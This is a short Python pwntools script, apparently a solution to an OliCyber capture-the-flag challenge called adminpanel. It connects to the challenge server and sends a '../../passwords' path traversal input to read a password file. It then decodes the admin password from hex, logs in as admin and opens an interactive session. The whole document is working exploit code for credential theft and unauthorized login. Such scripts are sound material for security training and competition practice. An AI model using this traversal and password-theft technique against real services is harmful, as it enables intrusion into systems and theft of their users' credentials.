from pwn import *

user="admin"

r = remote("adminpanel.challs.olicyber.it", 12200)
r.recvuntil(b'Esci\n')
r.sendline(b'3')
r.recvuntil(b'? ')
r.sendline(b'../../passwords') # path trasversal
r.recvuntil(b'admin:')
passw= bytes.fromhex(r.recvuntil(b'manuele').decode().strip())
print(passw)
r.sendline(b'1')
r.sendline(user)
r.sendline(passw)
r.sendline(b'53')
r.interactive()
flag=""

